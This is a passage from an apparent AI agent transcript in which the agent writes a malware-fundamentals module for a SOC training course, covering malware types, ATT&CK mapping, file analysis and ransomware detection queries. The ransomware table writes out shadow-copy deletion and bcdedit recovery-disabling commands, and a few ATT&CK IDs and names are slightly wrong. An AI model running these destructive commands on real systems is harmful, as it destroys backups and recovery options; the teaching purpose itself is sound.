7 major EDR vendors\n- [ ] List 9 EDR health metrics\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 14 — Malware Fundamentals*",
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/13-endpoint-security.md"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 33.5s)

_Thinking:_

Good, Module 13 is done. Now let me continue with Module 14 - Malware Fundamentals.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 22 - SOAR and Automation",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 23 - Query and Log Analysis",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 24 - Incident Response",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 25 - Forensics Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 26 - Security Products",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 27 - Cloud Security Basics",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 28 - Real SOC Case Studies",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 29 - Interview Preparation",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 30 - Practical Labs",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 31 - SOC Ticketing",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 32 - Advanced Optional Topics",
    "status": "pending",
    "priority": "low"
  },
  {
    "content": "Create Cheat Sheets and Reference Materials",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Curriculum Index and Study Guide",
    "status": "pending",
    "priority": "high"
  }
]
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 147.2s)

_Thinking:_

Now let me create Module 14 - Malware Fundamentals.

**Tool: write**

**Input:**
```json
{
  "filePath": "/Users/n0rthstar/Desktop/adsız klasör/mxdr-l1-soc-crash-course/modules/14-malware-fundamentals.md",
  "content": "# Module 14: Malware Fundamentals\n\n**Priority: P1 — Understand what you're detecting. L1 doesn't reverse engineer, but must recognize behaviors.**\n\n---\n\n## 14.1 Malware Taxonomy — Types & Purposes\n\n| Type | Primary Purpose | Propagation | Persistence | Example Families |\n|------|-----------------|-------------|-------------|------------------|\n| **Virus** | Infect files, replicate | File infection (user action) | File/boot sector | CIH, Sality, Virut |\n| **Worm** | Self-propagate across network | Network exploits, shares, email | Registry, services, tasks | Conficker, WannaCry, NotPetya |\n| **Trojan** | Disguised as legitimate | Social engineering, drive-by | Various | Emotet, Trickbot, Zeus |\n| **RAT (Remote Access Trojan)** | Full remote control | Trojan dropper | Strong (rootkit-level) | NjRAT, DarkComet, AsyncRAT, Quasar |\n| **Ransomware** | Encrypt files for ransom | Worm, Trojan, exploit | Often minimal (hit-and-run) | LockBit, Conti, BlackCat, Ryuk, REvil |\n| **Spyware/InfoStealer** | Steal data (creds, cookies, crypto) | Trojan, malvertising | Moderate | RedLine, Raccoon, Vidar, Azorult |\n| **Rootkit/Bootkit** | Hide presence, kernel persistence | Exploit, driver load | **Kernel/Boot** | TDL4, Necurs, MosaicLoader |\n| **Loader/Dropper** | Deliver next-stage payload | Trojan, exploit | Often none (memory-only) | Cobalt Strike (Beacon), Sliver, Metasploit |\n| **Downloader** | Download additional malware | Trojan, script | Minimal | BazarLoader, IcedID, Qakbot |\n| **Backdoor** | Persistent unauthorized access | Trojan, exploit | Strong | China Chopper, Web shells, C2 frameworks |\n| **Botnet Agent** | DDoS, spam, proxy, crypto-mining | Worm, Trojan | Moderate | Mirai, Mozi, XMRig |\n| **Crypto-Miner** | Mine cryptocurrency | Trojan, exploit, drive-by | Moderate | XMRig, CoinHive, SilentMiner |\n| **Wiper** | Destroy data (no ransom) | Worm, exploit | None | Shamoon, Olympic Destroyer, HermeticWiper |\n\n---\n\n## 14.2 Malware Lifecycle (Kill Chain Mapping)\n\n```\nINITIAL ACCESS\n    │\n    ├─ Phishing (Attachment/Link)     → T1566\n    ├─ Exploit Public-Facing App      → T1190\n    ├─ Valid Accounts (Credential)    → T1078\n    ├─ Drive-by Compromise            → T1189\n    ├─ Supply Chain                   → T1195\n    └─ Removable Media                → T1091\n    │\n    ▼\nEXECUTION\n    │\n    ├─ User Execution (Macro, Script) → T1204\n    ├─ Command/Scripting Interpreter  → T1059\n    ├─ Native API                     → T1106\n    ├─ Scheduled Task/Job             → T1053\n    ├─ Service Execution              → T1569\n    └─ Inter-Process Communication    → T1559\n    │\n    ▼\nPERSISTENCE\n    │\n    ├─ Registry Run Keys              → T1547.001\n    ├─ Scheduled Task                 → T1053.005\n    ├─ Service Creation               → T1543.003\n    ├─ WMI Event Subscription         → T1546.003\n    ├─ Boot/Logon Autostart           → T1547\n    ├─ Account Manipulation           → T1098\n    └─ Bootkit/Rootkit                → T1542\n    │\n    ▼\nPRIVILEGE ESCALATION\n    │\n    ├─ Exploit Vulnerability          → T1068\n    ├─ Token Manipulation             → T1134\n    ├─ Bypass UAC                     → T1548\n    ├─ Access Token Impersonation     → T1134\n    └─ Valid Accounts                 → T1078\n    │\n    ▼\nDEFENSE EVASION\n    │\n    ├─ Process Injection              → T1055\n    ├─ Masquerading                   → T1036\n    ├─ Disable Security Tools         → T1562\n    ├─ Indicator Removal (Logs)       → T1070\n    ├─ Obfuscation/Encoding           → T1027\n    ├─ Rootkit                        → T1014\n    └─ Signed Binary Proxy            → T1218\n    │\n    ▼\nCREDENTIAL ACCESS\n    │\n    ├─ OS Credential Dumping (LSASS)  → T1003.001\n    ├─ LSASS Memory                   → T1003.001\n    ├─ DC Sync                        → T1003.006\n    ├─ Kerberoasting                  → T1558.003\n    ├─ AS-REP Roasting                → T1558.004\n    ├─ Pass-the-Hash                  → T1550.002\n    └─ Credential from Web Browser    → T1555.003\n    │\n    ▼\nDISCOVERY\n    │\n    ├─ System Info Discovery          → T1082\n    ├─ File/Directory Discovery       → T1083\n    ├─ Network Share Discovery        → T1135\n    ├─ Permission Groups Discovery    → T1069\n    ├─ System Network Config          → T1016\n    ├─ Remote System Discovery        → T1018\n    └─ Account Discovery              → T1087\n    │\n    ▼\nLATERAL MOVEMENT\n    │\n    ├─ SMB/Windows Admin Shares       → T1021.002\n    ├─ Remote Desktop Protocol        → T1021.001\n    ├─ Pass-the-Hash                  → T1550.002\n    ├─ Pass-the-Ticket                → T1550.003\n    ├─ WinRM                          → T1021.006\n    ├─ WMI                            → T1021.004\n    └─ SSH                            → T1021.004\n    │\n    ▼\nCOLLECTION\n    │\n    ├─ Data from Local System         → T1005\n    ├─ Data from Network Shares       → T1039\n    ├─ Input Capture (Keylogger)      → T1056\n    ├─ Screen Capture                 → T1113\n    ├─ Email Collection               → T1114\n    ├─ Clipboard Data                 → T1115\n    └─ Archive Collected Data         → T1560\n    │\n    ▼\nCOMMAND & CONTROL\n    │\n    ├─ Application Layer Protocol     → T1071\n    │   ├─ Web Protocols (HTTP/HTTPS) → T1071.001\n    │   ├─ DNS                        → T1071.004\n    │   └─ Mail Protocols             → T1071.003\n    ├─ Proxy                          → T1090\n    ├─ Communication Through Removable → T1092\n    ├─ Non-Application Layer          → T1095\n    ├─ Encrypted Channel              → T1573\n    ├─ Ingress Tool Transfer          → T1105\n    └─ Dynamic Resolution (DGA)       → T1568.002\n    │\n    ▼\nEXFILTRATION\n    │\n    ├─ Exfil Over Web Service         → T1567\n    ├─ Exfil Over C2 Channel          → T1041\n    ├─ Exfil Over Alternative Protocol → T1048\n    ├─ Scheduled Transfer             → T1029\n    └─ Automated Exfiltration         → T1020\n    │\n    ▼\nIMPACT\n    │\n    ├─ Data Encrypted (Ransomware)    → T1486\n    ├─ Data Destruction               → T1485\n    ├─ Service Stop                   → T1489\n    ├─ System Shutdown/Reboot         → T1529\n    ├─ Defacement                     → T1491\n    └─ Firmware Corruption            → T1495\n```\n\n---\n\n## 14.3 File Analysis Basics (Static)\n\n### PE (Portable Executable) Structure\n```\nDOS Header (MZ)\n    │\n    ▼\nPE Signature (PE\\0\\0)\n    │\n    ▼\nCOFF File Header (Machine, Sections, Timestamp, Symbol Table)\n    │\n    ▼\nOptional Header (Magic, EntryPoint, ImageBase, Subsystem, DLL Characteristics, Data Directories)\n    │\n    ▼\nSection Headers (.text, .data, .rdata, .rsrc, .reloc, custom)\n    │\n    ▼\nSection Data\n```\n\n### Key Static Indicators\n| Indicator | Tool/Method | What It Reveals |\n|-----------|-------------|-----------------|\n| **Hashes** | MD5, SHA1, SHA256, SHA512, IMPHASH, SSDEEP (fuzzy) | Identification, clustering |\n| **Strings** | `strings`, `floss` (obfuscated) | URLs, IPs, registry keys, mutexes, commands, credentials |\n| **Imports (IAT)** | `dumpbin /imports`, `peframe`, `pestudio` | APIs used (WinInet, Crypto, Process, Registry, Network) |\n| **Exports** | `dumpbin /exports` | DLL functions, C2 callbacks |\n| **Sections** | Entropy, characteristics (R/W/X), names | Packing (high entropy), anomalies |\n| **Resources** | Icons, manifests, version info, embedded files | Metadata, decoy documents |\n| **Digital Signature** | `signtool verify`, VirusTotal | Trust, cert details, revocation |\n| **Rich Header** | Visual Studio version, build info | Compiler fingerprinting |\n| **Compile Time** | PE Timestamp (can be forged) | Timeline (verify with other sources) |\n| **Subsystem** | GUI (2) vs CUI (3) vs Native (1) | Execution context |\n\n### Packing/Compression Detection\n| Indicator | Normal | Packed |\n|-----------|--------|--------|\n| **Section Entropy** | < 6.5 | **> 7.0** (encrypted/compressed) |\n| **Section Names** | Standard (.text, .data) | **UPX, .aspack, .themida, .vmp, custom** |\n| **Raw vs Virtual Size** | Similar | **Raw << Virtual** (compressed) |\n| **Entry Point** | In .text | **In packed section** |\n| **Imports** | Many | **Few (LoadLibrary/GetProcAddress)** |\n\n**Common Packers**: UPX, ASPack, Themida, VMProtect, Enigma, .NET Reactor, ConfuserEx.\n\n---\n\n## 14.4 Dynamic Analysis (Behavioral)\n\n### Sandbox Environment\n| Component | Purpose |\n|-----------|---------|\n| **VM (Windows/Linux)** | Isolated execution |\n| **Network Simulation** | INetSim, FakeNet, C2 simulation |\n| **Process Monitor** | Procmon (file, reg, process, network) |\n| **API Monitor** | Rohitab API Monitor, Frida |\n| **Memory Capture** | Volatility, DumpIt, Process Hacker |\n| **PCAP Capture** | Wireshark, tcpdump |\n| **Registry Snapshot** | Regshot, Compare |\n| **File System Snapshot** | DirWatch, snapshot diff |\n\n### Behavioral Indicators\n| Behavior | API Calls / Artifacts |\n|----------|----------------------|\n| **Process Injection** | `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`, `QueueUserAPC`, `NtMapViewOfSection` |\n| **Credential Theft** | `OpenProcess` (LSASS, PID), `MiniDumpWriteDump`, `sekurlsa::logonpasswords` |\n| **Persistence** | `RegSetValueEx` (Run keys), `CreateService`, `CreateScheduledTask`, `WMI` |\n| **Defense Evasion** | `SetThreadContext` (ETW), `NtProtectVirtualMemory` (unhook), `DeleteFile` (logs) |\n| **Network/C2** | `WinHttpOpen`, `InternetOpen`, `WSASocket`, `connect`, `send`, `recv` |\n| **File Operations** | `CreateFile`, `WriteFile`, `CopyFile`, `MoveFile`, `DeleteFile`, `CryptEncrypt` |\n| **Discovery** | `NetShareEnum`, `NetUserEnum`, `GetSystemInfo`, `GetAdaptersInfo`, `ADSI/LDAP` |\n\n---\n\n## 14.5 Ransomware — Specific Behaviors\n\n### Encryption Patterns\n| Pattern | Description |\n|---------|-------------|\n| **File Extension Change** | `.lockbit`, `.contii`, `.blackcat`, `.ransom`, random |\n| **Ransom Note** | `README.txt`, `HOW_TO_DECRYPT.html`, `RESTORE_FILES.txt` |\n| **Targeted Extensions** | Documents, images, databases, code, backups, VMs |\n| **Excluded Paths** | `C:\\Windows`, `C:\\Program Files`, `C:\\$Recycle.Bin` (avoid breaking OS) |\n| **Volume Shadow Copy Deletion** | `vssadmin delete shadows /all /quiet`, `wmic shadowcopy delete` |\n| **Boot Configuration** | `bcdedit /set {default} recoveryenabled No`, `bcdedit /set {default} bootstatuspolicy ignoreallfailures` |\n| **Process Termination** | Kill AV/EDR, databases (SQL, Oracle), backup agents, email |\n| **Network Propagation** | SMB (EternalBlue), RDP brute, PsExec, WMI |\n| **Encryption Algorithm** | AES-256 (files) + RSA-2048/4096 (key wrapping) |\n| **Key Management** | Per-file keys, embedded public key, C2 for private key |\n\n### Ransomware Detection (EDR/Logs)\n```kql\n// Mass file modification + entropy increase\nFileEvents\n| where Action in (\"Modified\", \"Created\", \"Renamed\")\n| where Extension in (\".lockbit\", \".contii\", \".blackcat\", \".ransom\") \n   or Entropy > 7.5\n| summarize Count=count(), Extensions=make_set(Extension), Paths=make_set(Path)\n  by DeviceName, InitiatingProcessAccountName, bin(Timestamp, 5m)\n| where Count > 50\n\n// VSS deletion\nProcessEvents\n| where FileName in (\"vssadmin.exe\", \"wmic.exe\")\n| where CommandLine has \"shadow\" and CommandLine has \"delete\"\n| project Timestamp, DeviceName, AccountName, FileName, CommandLine\n\n// Boot config modification\nProcessEvents\n| where FileName == \"bcdedit.exe\"\n| where CommandLine has \"recoveryenabled No\" or CommandLine has \"bootstatuspolicy ignoreallfailures\"\n```\n\n---\n\n## 14.6 Malware Delivery Vectors — L1 Detection Points\n\n| Vector | Initial Artifact | Detection |\n|--------|------------------|-----------|\n| **Phishing Email** | Attachment (.doc, .pdf, .iso, .zip), Link | Email gateway, sandbox, user report |\n| **Malicious Macro** | Office doc with VBA/XLM/Excel 4.0 macro | EDR (Office → Script), AMSI, 4104 |\n| **Exploit (Drive-by)** | Browser/Plugin exploit kit | EDR (browser exploit), NDR (exploit traffic) |\n| **Watering Hole** | Compromised legitimate site | Proxy logs, threat intel |\n| **Malvertising** | Malicious ad → Exploit/Download | Proxy, DNS, EDR |\n| **Software Supply Chain** | Trojanized legitimate update | Hash mismatch, cert validation, vendor advisory |\n| **Removable Media** | AutoRun.inf, LNK, executable | EDR (USB insert), GPO disable AutoRun |\n| **Valid Credentials** | VPN, RDP, VPN, SaaS | Auth logs (impossible travel, new device), MFA |\n| **Exploit Public App** | Web app vuln (Log4Shell, ProxyShell) | WAF, NDR, app logs |\n| **SEO Poisoning** | Malicious search results → Download | Proxy, DNS, EDR |\n\n---\n\n## 14.7 Malware Classification for Triage\n\n| Classification | Criteria | Action |\n|----------------|----------|--------|\n| **Known Malicious** | Hash match (VT, internal, vendor), YARA hit, high-confidence TI | **Block, Quarantine, Escalate** |\n| **Suspicious** | Behavioral anomalies, unknown hash with bad traits, low-rep cert, packer | **Investigate, Sandbox, Monitor** |\n| **Potentially Unwanted (PUA)** | Adware, browser toolbar, bundleware, miner (user-installed) | **Policy decision, Remove if unauthorized** |\n| **Benign / Clean** | Known good (allowlist), vendor signed, internal tool | **Allow, Close alert** |\n| **Unknown / Inconclusive** | No verdict, conflicting verdicts | **Sandbox, Deep static, Time-box, Escalate if persistent** |\n\n---\n\n## 14.8 Threat Intelligence for Malware\n\n### Key TI Sources for L1\n| Source | Type | Access |\n|--------|------|--------|\n| **VirusTotal** | Hash, URL, Domain, IP, File analysis | Web, API |\n| **Hybrid Analysis** | Dynamic sandbox reports | Web, API |\n| **MalwareBazaar** | Malware samples, hashes, tags | Web, API |\n| **URLhaus** | Malicious URLs, payloads | Web, API |\n| **AbuseIPDB** | Abusive IPs | Web, API |\n| **AlienVault OTX** | Pulses (IOCs, context) | Web, API |\n| **MISP** | Threat sharing platform | Platform |\n| **Vendor Feeds** | CrowdStrike, Microsoft, Palo Alto, etc. | Integrated |\n\n### Enrichment Workflow\n```\nAlert → Extract IOCs (Hash, IP, Domain, URL, Email) \n       → Query TI Sources (Automated via SOAR)\n       → Correlate: Malware Family, Actor, Campaign, TTPs\n       → Context: First Seen, Prevalence, Targeted Sectors\n       → Decision: TP/FP/BP + Severity + MITRE Mapping\n```\n\n---\n\n## 14.9 Interview Questions for This Module\n\n1. **What is the difference between a virus and a worm?**\n   - Virus: Requires user action to propagate (file infection). Worm: Self-propagates via network exploits/shares without user interaction.\n\n2. **Name 5 malware types and their primary purpose.**\n   - Ransomware (encrypt for ransom), RAT (remote control), InfoStealer (credential/data theft), Loader (deliver payload), Crypto-miner (mine cryptocurrency).\n\n3. **What are the key stages of the malware lifecycle (kill chain)?**\n   - Initial Access → Execution → Persistence → Privilege Escalation → Defense Evasion → Credential Access → Discovery → Lateral Movement → Collection → C2 → Exfiltration → Impact.\n\n4. **What static analysis indicators do you check for a suspicious file?**\n   - Hashes (MD5/SHA256/IMPHASH/SSDEEP), Strings (URLs, IPs, commands), Imports (APIs), Sections (entropy, names), Digital Signature, Resources, Rich Header, Compile Time.\n\n5. **How do you detect a packed executable statically?**\n   - High section entropy (>7.0), non-standard section names (UPX, .aspack), Raw size << Virtual size, Entry point in packed section, Few imports (LoadLibrary/GetProcAddress).\n\n6. **What behavioral indicators suggest ransomware?**\n   - Mass file modifications (renames/encrypts), high entropy files, ransom notes, VSS deletion (`vssadmin delete shadows`), boot config modification (`bcdedit`), process termination (AV/DB/backup), network propagation (SMB/RDP).\n\n7. **What is a \"Loader\" vs \"Dropper\" vs \"Downloader\"?**\n   - Loader: Executes payload in memory (often reflective). Dropper: Writes payload to disk then executes. Downloader: Fetches payload from remote source.\n\n8. **How do you use threat intelligence for malware triage?**\n   - Extract IOCs from alert → Query VT, Hybrid Analysis, MalwareBazaar, URLhaus, OTX → Correlate family, actor, campaign, TTPs → Context (first seen, prevalence, targets) → Classify TP/FP/BP + severity.\n\n9. **What is IMPHASH and why is it useful?**\n   - Import Table Hash — fingerprints malware by imported DLLs/functions. Identifies variants/families even when binary is repacked/recompiled.\n\n10. **What are common malware delivery vectors L1 should monitor?**\n    - Phishing (attachments/links), malicious macros, drive-by exploits, watering holes, malvertising, supply chain, removable media, valid credentials (VPN/RDP), public app exploits, SEO poisoning.\n\n---\n\n## 14.10 Study Checklist for Module 14\n\n- [ ] Define 12 malware types with purpose, propagation, persistence\n- [ ] Map malware lifecycle to MITRE ATT&CK tactics (14 stages)\n- [ ] Perform static analysis: hashes, strings, imports, sections, entropy, signature\n- [ ] Identify packing indicators (entropy, section names, raw/virtual size, entry point)\n- [ ] Describe dynamic analysis sandbox components and behavioral indicators\n- [ ] List 10 ransomware-specific behaviors and detection queries\n- [ ] Map 10 delivery vectors to detection points\n- [ ] Classify malware alerts: Known Malicious, Suspicious, PUA, Benign, Unknown\n- [ ] Execute TI enrichment workflow for hash/IP/domain\n- [ ] Answer all 10 interview questions without notes\n\n---\n\n*Next: Module 15 — Command and Control*"
}
```

**Output:**
```
Wrote file successfully.
```

---

## Assistant (Build · Nemotron 3 Ultra (free) · 32.8s)

_Thinking:_

Good, Module 14 is done. Now let me continue with Module 15 - Command and Control.

**Tool: todowrite**

**Input:**
```json
{
  "todos": [
    {
      "content": "Create Module 0 - SOC and MXDR Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 2 - Alert Triage Methodology",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 3 - Incident Severity and Escalation",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 4 - Windows Security & Event Logs",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 5 - Sysmon Telemetry",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 6 - PowerShell Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 7 - Active Directory",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 8 - Kerberos and NTLM",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 9 - Networking for SOC",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 10 - DNS Security",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 11 - HTTP/HTTPS/TLS",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 12 - Network Traffic Analysis",
      "priority": "medium",
      "status": "completed"
    },
    {
      "content": "Create Module 13 - Endpoint Security",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 14 - Malware Fundamentals",
      "priority": "high",
      "status": "completed"
    },
    {
      "content": "Create Module 15 - Command and Control",
      "priority": "high",
      "status": "in_progress"
    },
    {
      "content": "Create Module 16 - Phishing and Email Security",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 17 - Threat Intelligence",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 18 - MITRE ATT&CK",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 19 - Common Attacks",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 20 - Web Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 21 - Linux Security",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 22 - SOAR and Automation",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 23 - Query and Log Analysis",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 24 - Incident Response",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 25 - Forensics Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 26 - Security Products",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 27 - Cloud Security Basics",
      "priority": "medium",
      "status": "pending"
    },
    {
      "content": "Create Module 28 - Real SOC Case Studies",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 29 - Interview Preparation",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 30 - Practical Labs",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 31 - SOC Ticketing",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Module 32 - Advanced Optional Topics",
      "priority": "low",
      "status": "pending"
    },
    {
      "content": "Create Cheat Sheets and Reference Materials",
      "priority": "high",
      "status": "pending"
    },
    {
      "content": "Create Curriculum Index and Study Guide",
      "priority": "high",
      "status": "pending"
    }
  ]
}
```

**Output:**
```
[
  {
    "content": "Create Module 0 - SOC and MXDR Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 1 - MDR/XDR/MXDR Deep Dive",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 2 - Alert Triage Methodology",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 3 - Incident Severity and Escalation",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 4 - Windows Security & Event Logs",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 5 - Sysmon Telemetry",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 6 - PowerShell Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 7 - Active Directory",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 8 - Kerberos and NTLM",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 9 - Networking for SOC",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 10 - DNS Security",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 11 - HTTP/HTTPS/TLS",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 12 - Network Traffic Analysis",
    "status": "completed",
    "priority": "medium"
  },
  {
    "content": "Create Module 13 - Endpoint Security",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 14 - Malware Fundamentals",
    "status": "completed",
    "priority": "high"
  },
  {
    "content": "Create Module 15 - Command and Control",
    "status": "in_progress",
    "priority": "high"
  },
  {
    "content": "Create Module 16 - Phishing and Email Security",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 17 - Threat Intelligence",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 18 - MITRE ATT&CK",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 19 - Common Attacks",
    "status": "pending",
    "priority": "high"
  },
  {
    "content": "Create Module 20 - Web Security",
    "status": "pending",
    "priority": "medium"
  },
  {
    "content": "Create Module 21 - Linux Security",
    "status": "pending",
    "priority": "medium"
  },
  {
